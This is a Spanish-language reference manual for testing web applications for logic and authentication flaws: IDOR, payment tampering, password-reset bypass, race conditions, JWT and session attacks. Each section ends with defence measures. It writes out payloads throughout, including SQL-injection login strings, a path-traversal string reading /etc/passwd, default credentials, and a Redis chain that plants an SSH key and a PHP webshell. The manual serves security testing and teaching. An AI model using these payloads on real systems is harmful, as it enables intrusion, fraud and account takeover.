# Seguridad de Lógica de Negocio y Autenticación Web

> **Fuente**: Basado en 88,636 vulnerabilidades reales de la base de datos WooYun, abarca dos grandes categorías: defectos de lógica (8,292 casos) y acceso no autorizado (14,377 casos)
> **Uso**: Manual de referencia práctico para pruebas de vulnerabilidades de lógica y bypass de autenticación en aplicaciones Web

---

## Uno. Vulnerabilidades de escalada de privilegios (control de acceso roto)

### 1.1 Esencia de la vulnerabilidad

La causa raíz de las vulnerabilidades de control de acceso roto es la **falta o insuficiencia de la validación de autorización** — el servidor no verifica en cada operación sobre un recurso si el solicitante tiene el permiso correspondiente.

| Tipo | Definición | Causa raíz | Nivel de riesgo |
|------|------|------|----------|
| Horizontal (IDOR) | Acceso indebido entre usuarios del mismo nivel | No se valida la pertenencia del recurso | Alto |
| Vertical | Un usuario de bajo privilegio ejecuta operaciones de alto privilegio | No se valida el permiso del rol | Crítico |

### 1.2 Escalada horizontal (IDOR)

**Escenarios frecuentes y forma de explotación**:

```
Escenario 1: Enumeración de ID — ID autoincremental resulta predecible
GET /address/edit/?addid=100001  → propia dirección
GET /address/edit/?addid=100002  → dirección de otro usuario (escalada de privilegios)

Escenario 2: Ataque de sustitución de recurso — la operación de modificación carece de validación de propiedad
Cuenta A crea factura ID=1001 → cuenta B, al modificar, sustituye el ID=1001 → la factura de A queda sobrescrita

Escenario 3: Enumeración de parámetros de API — la interfaz solo valida el login, no el permiso
/personal/center/family/{id}/edit → sustituir id filtra información de otro usuario
```

**Método de prueba**:
1. Interceptar la petición y registrar el parámetro ID en una petición normal (uid/orderId/addid, etc.)
2. Sustituirlo por el ID de otro usuario y observar la respuesta
3. Automatizar la enumeración (Burp Intruder o script)
4. Prestar atención a las cuatro operaciones CRUD; modificar y eliminar son las de mayor riesgo

```python
# Idea de detección automatizada de IDOR
def idor_test(base_url, param_name, id_range, session_cookie):
    for id in range(id_range[0], id_range[1]):
        resp = requests.get(
            f"{base_url}?{param_name}={id}",
            cookies={"session": session_cookie}
        )
        if resp.status_code == 200 and "característica de dato sensible" in resp.text:
            print(f"[!] IDOR: {param_name}={id}")
```

**Matriz de pruebas de escalada de privilegios**:

| Tipo de operación | Método de prueba | Nivel de riesgo |
|----------|----------|----------|
| Consultar | Sustituir ID de recurso | Medio |
| Modificar | Sustituir ID de recurso + datos | Alto |
| Eliminar | Sustituir ID de recurso | Crítico |
| Crear | Sustituir ID de usuario propietario | Alto |

### 1.3 Escalada vertical

**Forma de explotación central**:

```http
# Un usuario normal manipula el identificador de rol al modificar su perfil
POST /updateUser HTTP/1.1
user.aid=3&user.name=test   # aid=3 usuario normal

# Manipulación a administrador
POST /updateUser HTTP/1.1
user.aid=1&user.name=test   # aid=1 super administrador
```

**Puntos clave de detección**:
- Enumerar ID de rol: generalmente 1=super admin, 2=administrador, 3+=usuario normal
- Probar el cambio de rol: modificar el identificador de rol en la petición (role/aid/type/level)
- Acceder directamente a la URL de la interfaz de administrador con una cuenta de bajo privilegio
- Manipular el identificador de permiso: `isAdmin=0->1`, `role=user->admin`

### 1.4 Medidas de defensa

- Validar obligatoriamente la propiedad antes de acceder al recurso: `WHERE id=? AND user_id=usuario_actual`
- Usar UUID en lugar de ID autoincremental para evitar la enumeración
- Registrar log de auditoría para operaciones sensibles
- Aplicar el principio de mínimo privilegio, con autorización verificada interfaz por interfaz en el backend
- Gestión centralizada de la lógica de validación de permisos (middleware/interceptor)

---

## Dos. Vulnerabilidades de lógica de pago

### 2.1 Esencia de la vulnerabilidad

El núcleo de las vulnerabilidades de pago es un **error en el límite de confianza** — se traslada al cliente lógica sensible como el cálculo del precio, y el servidor no la valida de forma independiente.

```
Modelo de seguridad: zona no confiable (cliente) -> límite de confianza -> zona confiable (servidor)
Implementación incorrecta: aceptar directamente el precio enviado por el cliente como hecho
Implementación correcta: el cliente solo provee el ID del producto, el servidor consulta y calcula el precio de forma independiente
```

### 2.2 Escenarios comunes y técnicas de explotación

**Escenario 1: Manipulación directa del monto**

```http
# Petición original
POST /order/create HTTP/1.1
{"productId":"12345","quantity":1,"price":299.00}

# Petición manipulada
POST /order/create HTTP/1.1
{"productId":"12345","quantity":1,"price":0.01}
```

**Escenario 2: Abuso de la lógica de cupones/descuentos**

```
1. Comprar el producto A (59 yuanes), lo que activa la promoción "compra por 59 y canjea B (5.9 yuanes)"
2. Se ordena A+B, se paga 64.9 yuanes
3. Se cancela el producto A, dejando solo B
4. En la práctica se obtiene el producto B (precio original 21 yuanes) por solo 5.9 yuanes

Idea de prueba: cancelación parcial tras pedido combinado, devolución tras uso de cupón, reembolso tras canje de puntos
```

**Escenario 3: Obtención abusiva de moneda virtual**
- Registro con referido otorga puntos -> fuerza bruta de captcha para registro masivo -> canje de puntos por productos físicos

**Escenario 4: Ataque con cantidad/números negativos**
- `count=1 -> count=-1` (número negativo provoca reembolso)
- `price=100 -> price=-100` (monto negativo)

### 2.3 Metodología de prueba sistemática

```
Fase 1: Identificación de huella de parámetros
  - Interceptar la interfaz de creación de pedidos
  - Identificar parámetros de precio (price/amount/total/cost/discount)
  - Determinar el tipo de parámetro (entero/flotante/cadena)

Fase 2: Prueba de valores límite
  - Valor mínimo: 0, 0.01
  - Número negativo: -1, -100, -0.01
  - Formato: notación científica (1e-10), JSON anidado
  - Precisión: desbordamiento de flotante, error de redondeo

Fase 3: Bypass de lógica
  - Redundancia de parámetros: enviar múltiples parámetros price
  - Sobrescritura de parámetros: subir el precio primero y luego bajarlo
  - Acumulación de cupones: manipulación doble de precio + descuento
  - Cancelación/devolución parcial tras pedido combinado

Fase 4: Validación en cada etapa del flujo de pago
  - Generación del pedido -> verificar el monto del pedido
  - Redirección al pago -> validar el monto de pago
  - Callback de pago -> falsificar la firma del callback
  - Flujo de reembolso -> verificar el monto del reembolso
```

**Técnicas de explotación avanzadas**:

```python
# Manipulación de precio + condición de carrera concurrente
import threading
def create_order():
    requests.post("/order/create", json={"price":0.01,"productId":"premium"})
threads = [threading.Thread(target=create_order) for _ in range(50)]
for t in threads: t.start()
```

```http
# Contaminación de parámetros: algunos frameworks procesan parámetros duplicados
POST /order/create?price=299.00&price=0.01

# Bypass por conversión de tipo
{"price":"0.01"}     cadena
{"price":1e-10}      notación científica
{"price":null}       inyección NULL
```

### 2.4 Medidas de defensa

```
Capa 1 validación de entrada: aceptar solo el ID de producto, no el price; el monto debe ser positivo con máximo 2 decimales
Capa 2 lógica de negocio: el servidor calcula el precio de forma independiente; rechazar/revisar manualmente si el monto se desvía de un umbral
Capa 3 integridad de datos: firma del pedido (HMAC) contra manipulación; timestamp contra replay; idempotencia contra duplicación
Capa 4 validación de pago: monto del callback = monto del pedido; máquina de estados estricta; log de auditoría de extremo a extremo
```

---

## Tres. Vulnerabilidades de restablecimiento de contraseña

### 3.1 Esencia de la vulnerabilidad

La esencia de las vulnerabilidades de restablecimiento de contraseña es la **ruptura de la cadena de verificación de identidad** — en algún punto del flujo de restablecimiento no se vincula correctamente la identidad del usuario.

### 3.2 Cuatro patrones principales de vulnerabilidad

**Patrón A: Fuga del código de verificación en la respuesta**

```http
POST /sendSmsCode HTTP/1.1
phone=13888888888

# la respuesta contiene directamente el código de verificación
{"code":0,"data":{"verifyCode":"123456"}}
```

Método de detección: interceptar el paquete de respuesta del envío del código de verificación, buscar un número de 4 a 6 dígitos.

**Patrón B: Código de verificación desvinculado del usuario**

```
1. Se recibe el código de verificación A en el propio número de teléfono
2. Se inicia la recuperación de contraseña en la cuenta objetivo
3. Se usa el código de verificación A para completar la verificación (sin vinculación a la identidad del usuario)
Causa raíz: el código de verificación solo se valida por su vigencia, no por su pertenencia al usuario
```

**Patrón C: Pasos del restablecimiento se pueden omitir**

```
Normal: ingresar cuenta -> verificación de identidad -> restablecer contraseña -> completado
Ataque: ingresar cuenta -> [omitir] -> acceder directamente a la página de restablecimiento de contraseña

Forma de implementación:
1. Analizar el JS del frontend para encontrar la URL de cada paso
2. Acceder directamente a la URL del paso 3
3. Modificar el DOM con F12: ocultar el paso de verificación, mostrar el paso de restablecimiento
```

**Patrón D: Parámetro de credencial controlable**

```http
POST /resetPassword HTTP/1.1
username=victim&newPassword=hacked123
# Vulnerabilidad: username proviene del cliente, puede manipularse a cualquier usuario
```

### 3.3 Flujo de prueba

```
Iniciar restablecimiento de contraseña
  +-- Interceptar y analizar la respuesta -> ¿contiene el código de verificación? -> Patrón A
  +-- Analizar el flujo de verificación
  |     +-- Multietapa -> intentar omitir pasos intermedios -> Patrón C
  |     +-- Etapa única -> verificar la vinculación de parámetros
  |           +-- ID de usuario controlable -> manipulación de parámetro -> Patrón D
  |           +-- Vinculado a Session -> prueba de fijación de sesión
  +-- Mecanismo del código de verificación
        +-- ¿está vinculado al usuario? -> Patrón B
        +-- ¿es susceptible a fuerza bruta (sin límite de frecuencia)?
        +-- ¿tiene vigencia temporal?
```

### 3.4 Medidas de defensa

- Vincular el código de verificación a la Session del usuario, verificar la pertenencia
- El código de verificación es de un solo uso y expira en 60 segundos
- El Token de restablecimiento es de un solo uso e impredecible
- Validación de estado en el servidor en todo el flujo, prohibir la omisión de pasos
- Bloqueo tras 5 intentos fallidos, para prevenir fuerza bruta

---

## Cuatro. Defectos de lógica de negocio

### 4.1 Esencia de la vulnerabilidad

Matriz de causas raíz de los defectos de lógica de negocio:

| Nivel | Tipo de defecto | Manifestación típica |
|------|----------|----------|
| Capa de negocio | Defecto de diseño del flujo | Pasos que se pueden omitir, estado que se puede falsificar |
| Capa de interfaz | Confianza excesiva en parámetros | Validación en el cliente, sin validación en el servidor |
| Capa de autenticación | Defecto de gestión de credenciales | Fuga de Token, fijación de Session |
| Capa de autorización | Límite de permisos difuso | Escalada horizontal/vertical |

### 4.2 Bypass de captcha

**Método de bypass 1: el captcha no se actualiza**
- Tras un intento fallido de login, el captcha no se actualiza automáticamente, el mismo captcha se puede reutilizar
- Explotación: reconocerlo manualmente una vez, luego usar el captcha fijo para fuerza bruta de la contraseña

**Método de bypass 2: el captcha es susceptible a fuerza bruta**
- 4-6 dígitos numéricos puros, sin límite de intentos/frecuencia
- Espacio de fuerza bruta 10000-1000000, con 30 hilos se completa en unos 30 segundos

**Método de bypass 3: validación solo en el frontend**
- El captcha solo se valida en el JS del frontend; eliminando el código de validación del frontend o llamando directamente a la interfaz se puede evadir

**Checklist de seguridad del captcha**:
- ¿Se filtra el captcha en la respuesta?
- ¿Está vinculado a la Session/usuario?
- ¿Tiene vigencia temporal (se recomienda 60 segundos)?
- ¿Se fuerza la actualización tras una verificación fallida?
- ¿Tiene límite de frecuencia (se recomienda 5 intentos/minuto)?
- ¿Tiene suficiente complejidad (se recomienda 6 caracteres alfanuméricos mixtos)?

### 4.3 Condición de carrera (Race Condition)

Escenarios aplicables: uso de cupones, canje de puntos, deducción de inventario, pago con saldo

```python
import threading, requests
def redeem():
    requests.post("/redeem", data={"points":1000, "item":"iPhone"})

# 100 solicitudes concurrentes, intentando canjear los mismos puntos varias veces
threads = [threading.Thread(target=redeem) for _ in range(100)]
for t in threads: t.start()
```

Causa raíz: la verificación del saldo y la deducción del saldo no son una operación atómica, lo que bajo concurrencia permite pasar la verificación varias veces.

### 4.4 Metodología sistemática de manipulación de parámetros

| Tipo de parámetro | Dirección de manipulación | Ejemplo |
|----------|----------|----------|
| ID de usuario | Sustituir por otro usuario | uid=1001->1002 |
| Monto | Reducir/anular/negativo | price=100->0.01 |
| Cantidad | Número negativo | count=1->-1 |
| Estado | Invertir el valor booleano | isPaid=false->true |
| Rol | Escalar el privilegio | role=user->admin |
| Tiempo | Extender la validez | expireTime->2099-12-31 |

### 4.5 Método de análisis inverso del flujo de negocio

```
Paso 1: dibujar el diagrama completo del flujo de negocio
Paso 2: identificar los puntos de validación en cada etapa
Paso 3: evaluar si la validación se puede evadir (¿frontend/backend? ¿replay posible? ¿parámetro controlable?)
Paso 4: diseñar casos de prueba de bypass

Ejemplo (flujo de restablecimiento de contraseña):
[Ingresar cuenta] -> [Enviar código de verificación] -> [Verificar identidad] -> [Establecer nueva contraseña]
     |              |              |              |
  enumeración de cuenta   fuga de código de verificación   omisión de paso   manipulación de parámetro
```

### 4.6 Principios de defensa

- **Autoridad del servidor**: toda validación debe completarse en el servidor, la validación del frontend es solo para UX
- **Operación atómica**: los negocios críticos (deducción/inventario) deben usar transacciones + bloqueo
- **Máquina de estados**: el flujo de negocio debe avanzar estrictamente según la máquina de estados, sin poder omitir pasos
- **Prevención de replay**: diseño idempotente en interfaces críticas, petición con timestamp + firma

---

## Cinco. Bypass de autenticación

### 5.1 Esencia de la vulnerabilidad

El núcleo del bypass de autenticación es la **ruptura de la cadena de confianza**: el sistema confía erróneamente en una declaración de identidad proveniente de una fuente no confiable.

### 5.2 Falsificación de Cookie/Session

```
# escribir directamente en la Cookie para obtener identidad
GET /registeruser/CookInsert?userAccount=admin&inner=1
-> escribe la identidad admin en la Cookie, obteniendo directamente la Session de administrador

# el identificador de identidad en la Cookie es predecible
Cookie: admin=true; userId=1
-> modificando el valor de la Cookie se puede cambiar de identidad
```

Bypass de JWT:

| Técnica | Payload |
|------|---------|
| Algoritmo none | alg: none |
| Clave débil | fuerza bruta de la clave HS256 |
| Confusión de algoritmo | convertir RS256 a HS256, firmando con la clave pública |

### 5.3 Bypass mediante manipulación de la respuesta

```
Normal: petición de verificación -> {"status":"0","msg":"código de verificación incorrecto"} -> permanece en la página de verificación
Ataque: petición de verificación -> interceptar la respuesta -> modificarla a {"status":"1","msg":"éxito"} -> avanza al siguiente paso
```

Condición aplicable: el cliente controla el flujo según el estado de la respuesta + el servidor no vuelve a validar en los pasos posteriores.

### 5.4 Falsificación de IP/bypass mediante encabezados

```http
# encabezados comunes para evadir la lista blanca de IP
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
Host: localhost
```

### 5.5 Bypass de ruta

```
# confusión de mayúsculas/minúsculas
/ADMIN/  /Admin/  /aDmIn/

# bypass por codificación URL
%2e%2e%2f = ../
%252e%252e%252f = ../ (doble codificación)

# truncamiento con byte nulo
../../../etc/passwd%00.jpg

# bypass agregando sufijo
/admin -> /admin/  /admin;.js  /admin%23
```

### 5.6 Acceso no autorizado al backend

Rutas de acceso no autorizado de alta frecuencia:

```
# middleware Web
/console/              (WebLogic)
/manager/html          (Tomcat)
/jmx-console/          (JBoss)
/actuator/env          (Spring Boot)
/actuator/heapdump     (Spring Boot, puede filtrar contraseñas)

# interfaces API
/swagger-ui.html       (documentación de API)
/api-docs              (documentación de API)
/api/configs           (fuga de configuración)

# depuración/administración
/admin/index.jsp
/phpMyAdmin/
/druid/index.html      (monitoreo Druid)
```

Referencia rápida de credenciales débiles de middleware:

| Middleware | Credenciales débiles comunes |
|--------|-----------|
| Tomcat | admin:admin, tomcat:tomcat |
| WebLogic | weblogic:weblogic, weblogic:12345678 |
| JBoss | admin:admin (o sin autenticación) |

### 5.7 Acceso no autorizado a bases de datos/servicios

| Servicio | Puerto | Comando de verificación | Forma de explotación |
|------|------|----------|----------|
| Redis | 6379 | redis-cli -h IP info | escribir clave pública SSH/Webshell/tarea programada |
| MongoDB | 27017 | mongo IP:27017 | conexión directa sin autenticación, exportar todos los datos |
| Elasticsearch | 9200 | curl IP:9200/_cat/indices | leer datos del índice |
| Memcached | 11211 | echo stats, nc IP 11211 | fuga de datos |
| Docker API | 2375 | curl IP:2375/info | escape de contenedor/RCE |

Cadena de explotación de Redis no autorizado (alto riesgo):

```bash
redis-cli -h target
# escribir clave pública SSH
config set dir /root/.ssh/
config set dbfilename authorized_keys
set x "\n\nssh-rsa AAAA...\n\n"
save

# escribir Webshell
config set dir /var/www/html/
config set dbfilename shell.php
set x "<?php system($_GET['c']);?>"
save
```

### 5.8 Bypass de Session

```
# fuga del Session ID (logs/URL)
/logs/ctp.log -> contiene el Session ID -> se usa directamente

# ataque de fijación de sesión
forzar al usuario a usar un Session ID especificado por el atacante

# predicción de Session
Session débil generado por timestamp/número secuencial -> el siguiente Session es predecible
```

### 5.9 Contraseña universal (login por inyección SQL)

```
Usuario: ' or 1=1--
Contraseña:   cualquiera

Usuario: admin'--
Contraseña:   cualquiera
```

### 5.10 Checklist de pruebas de bypass de autenticación

| Elemento de prueba | Método | Herramienta |
|--------|------|------|
| Falsificación de Cookie | modificar el campo identificador de usuario | BurpSuite |
| Fijación de Session | reutilizar la Session de otro usuario | herramienta de interceptación |
| Manipulación de respuesta | modificar el código de estado devuelto | BurpSuite |
| Falsificación de IP | agregar X-Forwarded-For | curl/Burp |
| Bypass en frontend | modificar la lógica JS | DevTools |
| Manipulación de JWT | algoritmo none/clave débil | jwt.io/hashcat |
| Bypass de ruta | mayúsculas/minúsculas/codificación/truncamiento | manual+diccionario |
| Credencial débil | probar credenciales predeterminadas | Hydra |
| Login por inyección SQL | contraseña universal | manual |

### 5.11 Medidas de defensa

| Ámbito | Medida |
|------|------|
| Red | los servicios internos no deben exponerse a internet público, acceso vía VPN/bastión |
| Autenticación | forzar contraseñas complejas, deshabilitar cuentas predeterminadas, habilitar MFA |
| Autorización | validar el permiso en cada interfaz en el backend, principio de mínimo privilegio |
| Session | regenerar el SessionID tras el login, HttpOnly+Secure |
| Monitoreo | alerta de login anómalo, bloqueo tras intentos fallidos, auditoría de logs |
| Endurecimiento | cerrar interfaces de depuración, eliminar páginas de administración predeterminadas |

---

## Seis. Marco de pruebas sistemático

### 6.1 Método de prueba en cuatro fases

```
Fase 1: Recolección de información
  - Enumerar todos los puntos funcionales e interfaces
  - Dibujar el diagrama del flujo de negocio
  - Identificar operaciones sensibles (pago/restablecimiento/cambio de permisos)
  - Determinar la controlabilidad de los parámetros

Fase 2: Modelado de amenazas
  - Analizar los parámetros de entrada y el límite de confianza de cada interfaz
  - Marcar validación en servidor vs. en frontend
  - Construir el árbol de ataque (clasificado por escalada/pago/autenticación)
  - Priorizar (alto impacto x alta probabilidad)

Fase 3: Verificación de vulnerabilidades
  - Probar cada elemento según prioridad
  - Registrar el PoC (capturas de petición/respuesta)
  - Evaluar el alcance del impacto (volumen de datos/número de usuarios/monto)

Fase 4: Elaboración del informe
  - Descripción de la vulnerabilidad + pasos de reproducción
  - Análisis de causa raíz + evaluación de impacto
  - Recomendaciones de corrección (corto plazo + largo plazo)
  - Clasificación de riesgo (CVSS)
```

### 6.2 Referencia rápida de patrones de vulnerabilidad de alta frecuencia

| Patrón de vulnerabilidad | Señal de detección | Método de verificación rápida |
|----------|----------|-------------|
| IDOR | URL/parámetro contiene ID autoincremental | sustituir el ID y ver si devuelve datos de otro usuario |
| Manipulación de monto | la petición contiene price/amount | cambiar a 0.01 y observar el pedido |
| Fuga del código de verificación | interceptar tras enviar el código | buscar un número de 4-6 dígitos en la respuesta |
| Omisión de pasos | flujo multietapa | acceder directamente a la URL del paso posterior |
| Manipulación de respuesta | el cliente redirige según el status | cambiar status=1 y ver si permite avanzar |
| Backend no autorizado | escaneo de directorios revela ruta de administración | acceder directamente y ver si requiere login |
| Credencial débil | se encuentra página de login | probar credenciales predeterminadas como admin/admin |
| Condición de carrera | operación de saldo/inventario/cupón | 50+ peticiones concurrentes y observar si hay deducción múltiple |

### 6.3 Herramientas recomendadas para la práctica

| Herramienta | Uso principal | Escenario aplicable |
|------|----------|----------|
| BurpSuite | intercepción de tráfico, manipulación de parámetros, replay | herramienta central para todos los escenarios |
| Postman | prueba de API, peticiones masivas | prueba de lógica de interfaz |
| Hydra | fuerza bruta de contraseñas | credenciales débiles/credential stuffing |
| OWASP ZAP | escaneo automatizado | descubrimiento inicial |
| Scripts personalizados | prueba de concurrencia, enumeración de ID | condición de carrera/IDOR |

---

*Versión del documento: v1.0*
*Fuente de datos: base de vulnerabilidades WooYun (88,636 registros): defectos de lógica (8,292 registros) + acceso no autorizado (14,377 registros)*
*Fecha de generación: 2026-02-06*
